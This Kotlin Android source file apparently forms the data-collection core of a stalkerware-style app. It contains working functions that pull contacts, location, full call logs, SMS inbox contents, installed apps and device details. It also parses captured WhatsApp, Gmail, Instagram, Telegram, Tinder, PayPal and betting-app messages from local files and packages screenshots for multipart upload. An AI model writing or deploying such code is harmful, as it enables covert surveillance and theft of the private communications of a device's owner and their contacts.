package com.umarabbas.firstproject

import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.pm.ResolveInfo
import android.database.Cursor
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.SystemClock
import android.provider.ContactsContract
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.core.content.ContextCompat.checkSelfPermission
import okhttp3.MultipartBody
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody

import java.io.File
import java.lang.Long
import java.text.SimpleDateFormat
import java.time.Duration
import java.util.*
import kotlin.time.hours
import kotlin.time.seconds

class Functions {
    companion object{
        /**
         * Returns the list of Contact which is a data class.
         * @return [List] of type [Contact].
         */
        fun getContacts(context : Context) : List<Contact> {
            val listOfContacts = mutableListOf<Contact>()
            var contact : Contact
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(
                            context,android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            } else {
                val resolver: ContentResolver = context.contentResolver;
                val cursor = resolver.query(
                        ContactsContract.Contacts.CONTENT_URI, null, null, null,
                        null)
                if (cursor!!.count > 0) {
                    while (cursor.moveToNext()) {
                        val id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID))
                        val name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
                        val phoneNumber = (cursor.getString(
                                cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))).toInt()
                        if (phoneNumber > 0) {
                            val cursorPhone = context.contentResolver.query(
                                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                    null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?", arrayOf(id), null)
                            if(cursorPhone!!.count > 0) {
                                while (cursorPhone.moveToNext()) {
                                    val phoneNumValue = cursorPhone.getString(
                                            cursorPhone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                                    contact = Contact(name , phoneNumValue)
                                    listOfContacts.add(contact)

                                }
                            }
                            cursorPhone.close()
                        }
                    }
                } else {
                    Log.d("Functions", "No Contacts Available")
                }
                cursor.close()
            }
            return listOfContacts
        }
        /**
         * Returns the object of Location which is a data class.
         * @return [Location].
         */
        fun getLocation(context : Context) : com.umarabbas.firstproject.Location {
            var location : Location
            if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION)
                    != PackageManager.PERMISSION_GRANTED) {
//                ActivityCompat.requestPermissions(
//                        context,
//                        arrayOf(android.Manifest.permission.ACCESS_FINE_LOCATION),
//                        101)
                location = Location("0","0")
            }
            else{
                val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                val isNetworkEnabled= locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
                if(isNetworkEnabled){
                    val loc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                    location = Location(loc!!.longitude.toString(), loc.latitude.toString())
                }else{
                    Log.d("Functions", "Not Connected")
                    location = Location("0","0")
                }
            }
            return location
        }
        /**
         * Returns the list of CallLog which is data class.
         * @param[Long]  it is optional parameter if you pass time in milliseconds it will return call logs after that time else it will return all call logs.
         * @return [List] of type [CallLog].
         */
        fun getCallLogs(context : Context, timeStamp: kotlin.Long? = null) : List<com.umarabbas.firstproject.CallLog>{
            val listOfCallLogs = mutableListOf<com.umarabbas.firstproject.CallLog>()
            var callLog : com.umarabbas.firstproject.CallLog
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(
                            context, android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
//                requestPermissions(arrayOf(android.Manifest.permission.READ_CALL_LOG),
//                        102)
            }else{
                val managedCursor: Cursor? = context.contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null)
                val number: Int = managedCursor!!.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
                val type: Int = managedCursor.getColumnIndex(android.provider.CallLog.Calls.TYPE)
                val date: Int = managedCursor.getColumnIndex(android.provider.CallLog.Calls.DATE)
                val name = managedCursor.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME)
                val duration: Int = managedCursor.getColumnIndex(android.provider.CallLog.Calls.DURATION)
                while (managedCursor.moveToNext()) {
                    val phNumber: String = managedCursor.getString(number)
                    val callType: String = managedCursor.getString(type)
                    var callerName : String = managedCursor.getString(name) + " "
                    val callDayTime = Date(Long.valueOf(managedCursor.getString(date)))


                    val callDuration: String = managedCursor.getString(duration)
                    var dir: String = ""
                    val dircode = callType.toInt()
                    when (dircode) {
                        android.provider.CallLog.Calls.OUTGOING_TYPE -> dir = "OUTGOING"
                        android.provider.CallLog.Calls.INCOMING_TYPE -> dir = "INCOMING"
                        android.provider.CallLog.Calls.MISSED_TYPE -> dir = "MISSED"
                    }
                    if(callerName == "null "){
                        callerName = "Unknown"
                    }
                    if(timeStamp != null){
                        if(compareValues(callDayTime.time,timeStamp) > 0){
                            callLog = CallLog(callerName,phNumber,dir,callDuration,callDayTime.time.toString())
                            listOfCallLogs.add(callLog)
                        }else{
                            break
                        }
                    }else{
                        callLog = CallLog(callerName,phNumber,dir,callDuration,callDayTime.time.toString())
                        listOfCallLogs.add(callLog)
                    }

                }
                managedCursor.close()
            }
            return listOfCallLogs
        }
        /**
         * Returns the list of Sms which is data class.
         * @param[Long]  it is optional parameter if you pass time in milliseconds it will return Sms after that time else it will return all Sms.
         * @return [List] of type [Sms].
         */
        fun getSms(context : Context, timeStamp: kotlin.Long? = null) : List<Sms> {
            val listOfSms = mutableListOf<Sms>()
            var sms : Sms
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(
                            context, android.Manifest.permission.READ_SMS
                    ) != PackageManager.PERMISSION_GRANTED
            ) {
//                requestPermissions(
//                        arrayOf(android.Manifest.permission.READ_SMS),
//                        103
//                )
            } else {

                val cursor: Cursor? = context.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
                if(cursor!!.moveToFirst()){
                    for(i in (0 until cursor.count)){
                        val number = cursor.getString(cursor.getColumnIndexOrThrow("address"))
                        val msg = cursor.getString(cursor.getColumnIndexOrThrow("body"))
                        val date = cursor.getString(cursor.getColumnIndex("date"))
                        val time = Long.parseLong(date)
                        val formatter = SimpleDateFormat("dd/MM/yyyy hh:mm:ss.SSS")
                        val calendar = Calendar.getInstance()
                        calendar.timeInMillis = time
                        val hms = formatter.format(calendar.time)
                        sms = Sms(number,msg,hms)
                        if(timeStamp != null){
                            if(compareValues(time,timeStamp) > 0){
                                listOfSms.add(sms)
                                cursor.moveToNext()
                            }else{
                                break
                            }
                        }else{
                            listOfSms.add(sms)
                            cursor.moveToNext()
                        }

                    }
                }
                cursor.close()
            }
            return listOfSms
        }
        /**
         * Returns the list of names of installed apps.
         * @return [List] of type [String].
         */
        @SuppressLint("WrongConstant")
        fun getAppList(context : Context) : List<String>{
            val listOfApps = mutableListOf<String>()
            val packageManager = context.packageManager
            val intent = Intent(Intent.ACTION_MAIN)
            intent.addCategory(Intent.CATEGORY_LAUNCHER)
            val appsList = packageManager.queryIntentActivities(intent, PackageManager.PERMISSION_GRANTED)
            for(resolveInfo : ResolveInfo in appsList){
                listOfApps.add(resolveInfo.activityInfo.applicationInfo.loadLabel(packageManager).toString())
            }
            return listOfApps
        }

        /**
         * Returns statistics of phone like connection type, current time, Device name, Last Restart total space, available space, Android Version, App Version.
         * @return [String].
         */
        fun getStatistics(context : Context) : Statistics{
            val networkType : String
            val time : String
            val device : String
            val battery : String
            val lastRestart : String
            val totalSize : String
            val availableSize : String
            val androidVersion : String
            val appVersion : String
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val nw      = cm.activeNetwork
                val actNw = cm.getNetworkCapabilities(nw)
                if(nw != null && actNw != null){
                    when {
                        actNw.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> networkType = " wifi"
                        actNw.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> networkType = " Cellular"
                        //for other device how are able to connect with Ethernet
                        actNw.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> networkType = " ethernet"
                        //for check internet over Bluetooth
                        actNw.hasTransport(NetworkCapabilities.TRANSPORT_BLUETOOTH) -> networkType = " bluetooth"
                        else -> networkType = " not connected"
                    }
                }else{
                    networkType = " not connected"
                }
            }
            else {
                val nwInfo = cm.activeNetworkInfo
                if(nwInfo != null && nwInfo.isConnected() && nwInfo.getType() == ConnectivityManager.TYPE_MOBILE){
                    networkType =  " Cellular"
                }else if(nwInfo != null && nwInfo.isConnected() && nwInfo.getType() == ConnectivityManager.TYPE_WIFI){
                    networkType = " Wifi"
                }else if(nwInfo != null && nwInfo.isConnected() && nwInfo.getType() == ConnectivityManager.TYPE_BLUETOOTH){
                    networkType = " Bluetooth"
                }else{
                    networkType = " Not Connected"
                }
            }
            val currentTime = Calendar.getInstance().time
            time = currentTime.toString()
            device = "${Build.MANUFACTURER} ${Build.MODEL}"

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
                battery = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY).toString()
            }
            else{
                val iFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED);
                val batteryStatus = context.registerReceiver(null, iFilter);
                val level: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
                val scale: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
                val batteryPct = level /  scale.toFloat()
                battery = ("${(batteryPct*100).toInt()}")
            }
            val formatter = SimpleDateFormat("dd/MM/yyyy hh:mm:ss.SSS")
            val calendar = Calendar.getInstance()
            calendar.timeInMillis = System.currentTimeMillis() - SystemClock.elapsedRealtime()
            val hms = formatter.format(calendar.time)
            lastRestart = hms

            var totalS = File(context.getExternalFilesDir(null).toString()).totalSpace.toDouble()
            var freeSize = (File(context.getExternalFilesDir(null).toString()).freeSpace).toDouble()

            var suffix = ""
            if (totalS >= 1024) {
                suffix = "KiB"
                totalS /= 1024
                if (totalS >= 1024) {
                    suffix = "MiB"
                    totalS /= 1024
                    if (totalS >= 1024) {
                        suffix = "GB"
                        totalS /= 1024
                    }
                }
            }
            totalSize = "${String.format("%.2f", totalS)} $suffix"

            if (freeSize >= 1024) {
                suffix = "KiB"
                freeSize /= 1024
                if (freeSize >= 1024) {
                    suffix = "MiB"
                    freeSize /= 1024
                    if (freeSize >= 1024) {
                        suffix = "GB"
                        freeSize /= 1024
                    }
                }
            }
            availableSize = "${String.format("%.2f", freeSize)} $suffix"
            androidVersion = Build.VERSION.RELEASE

            val info = context.packageManager?.getPackageInfo(
                    context.packageName, 0
            )

            val versionName = info?.versionName
            @Suppress("IMPLICIT_CAST_TO_ANY") val versionNumber = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                info?.longVersionCode
            } else {
                info?.versionCode
            }
            appVersion = "$versionNumber , $versionName"
            return Statistics(networkType, time,device, battery, lastRestart, totalSize, availableSize, androidVersion, appVersion)
        }
        /**
         * Returns [List] of [WhatsappSms].
         * @return [List] of type [WhatsappSms].
         */
        fun getWhatsappSms(context : Context) : List<WhatsappSms>{
            val file = File(context.getExternalFilesDir(null),
                    "whatsapp.txt")
            val list = mutableListOf<WhatsappSms>()
            if(file.exists()){
                val input = Scanner(file)
                input.useDelimiter("¬|\n")
                while(input.hasNext()){
                    val sender = input.next()
                    val msg = input.next()
                    val time = input.next()
                    val whatsappSms = WhatsappSms(sender, msg, time)
                    list.add(whatsappSms)
                }
                input.close()
            }
            return list
        }
        /**
         * Returns [List] of [Gmails].
         * @return [List] of type [Gmails].
         */
        fun getGmails(context : Context) : List<Gmails>{
            val file = File(context.getExternalFilesDir(null),
                    "gmail.txt")
            val list = mutableListOf<Gmails>()
            if(file.exists()){
                val input = Scanner(file)
                input.useDelimiter("¬|\n\n")
                while(input.hasNext()){
                    val title = input.next()
                    val msg = input.next()
                    val bigText = input.next()
                    val time = input.next()
                    val gmails = Gmails(title, msg,bigText, time)
                    list.add(gmails)
                }
                input.close()
            }
            return list
        }
        /**
         * Returns [List] of [Instagrams].
         * @return [List] of type [Instagrams].
         */
        fun getInstagrams(context : Context) : List<Instagrams>{
            val file = File(context.getExternalFilesDir(null),
                    "instagram.txt")
            val list = mutableListOf<Instagrams>()
            if(file.exists()){
                val input = Scanner(file)
                input.useDelimiter("¬|\n")
                while(input.hasNext()){
                    val title = input.next()
                    val msg = input.next()
                    val time = input.next()
                    val instagrams = Instagrams(title, msg, time)
                    list.add(instagrams)
                }
                input.close()
            }
            return list
        }
        /**
         * Returns [List] of [Twitters].
         * @return [List] of type [Twitters].
         */
        fun getTwittera(context : Context) : List<Twitters>{
            val file = File(context.getExternalFilesDir(null),
                    "twitter.txt")
            val list = mutableListOf<Twitters>()
            if(file.exists()){
                val input = Scanner(file)
                input.useDelimiter("¬|\n")
                while(input.hasNext()){
                    val title = input.next()
                    val msg = input.next()
                    val time = input.next()
                    val twitters = Twitters(title, msg, time)
                    list.add(twitters)
                }
                input.close()
            }
            return list
        }
        /**
         * Returns [List] of [Telegrams].
         * @return [List] of type [Telegrams].
         */
        fun getTelegrams(context : Context) : List<Telegrams>{
            val file = File(context.getExternalFilesDir(null),
                    "telegram.txt")
            val list = mutableListOf<Telegrams>()
            if(file.exists()){
                val input = Scanner(file)
                input.useDelimiter("¬|\n")
                while(input.hasNext()){
                    val title = input.next()
                    val msg = input.next()
                    val time = input.next()
                    val telegrams = Telegrams(title, msg, time)
                    list.add(telegrams)
                }
                input.close()
            }
            return list
        }
        /**
         * Returns [List] of [Tinders].
         * @return [List] of type [Tinders].
         */
        fun getTinders(context : Context) : List<Tinders>{
            val file = File(context.getExternalFilesDir(null),
                    "tinder.txt")
            val list = mutableListOf<Tinders>()
            if(file.exists()){
                val input = Scanner(file)
                input.useDelimiter("¬|\n")
                while(input.hasNext()){
                    val title = input.next()
                    val msg = input.next()
                    val time = input.next()
                    val tinders = Tinders(title, msg, time)
                    list.add(tinders)
                }
                input.close()
            }
            return list
        }
        /**
         * Returns [List] of [Paypal].
         * @return [List] of type [Paypal].
         */
        fun getPaypals(context : Context) : List<PayPal>{
            val file = File(context.getExternalFilesDir(null),
                    "paypal.txt")
            val list = mutableListOf<PayPal>()
            if(file.exists()){
                val input = Scanner(file)
                input.useDelimiter("¬|\n")
                while(input.hasNext()){
                    val title = input.next()
                    val msg = input.next()
                    val time = input.next()
                    val paypal = PayPal(title, msg, time)
                    list.add(paypal)
                }
                input.close()
            }
            return list
        }
        /**
         * Returns [List] of [OneXBet].
         * @return [List] of type [OneXBet].
         */
        fun getOneXBets(context : Context) : List<OneXBet>{
            val file = File(context.getExternalFilesDir(null),
                    "xbet.txt")
            val list = mutableListOf<OneXBet>()
            if(file.exists()){
                val input = Scanner(file)
                input.useDelimiter("¬|\n")
                while(input.hasNext()){
                    val title = input.next()
                    val msg = input.next()
                    val time = input.next()
                    val onexbet = OneXBet(title, msg, time)
                    list.add(onexbet)
                }
                input.close()
            }
            return list
        }

        /**
         * Returns [List] of [MultipartBody.Part].
         * @return [List] of type [MultipartBody.Part].
         */
        fun getScreenshots(context: Context) : List<MultipartBody.Part>{
            val folder = File(context.getExternalFilesDir(null),"/ScreenShot")
            val listOfSS = mutableListOf<MultipartBody.Part>()
            if(folder.exists()){
                val files = folder.listFiles()
                files?.let {
                    for(element in files){
                        val requestBody = element.asRequestBody("image/*".toMediaTypeOrNull())
                        val multipartBody = MultipartBody.Part.createFormData("Screenshot", "${element.name}", requestBody)
                        listOfSS.add(multipartBody)
                    }
                }
            }
            return listOfSS
        }
    }
}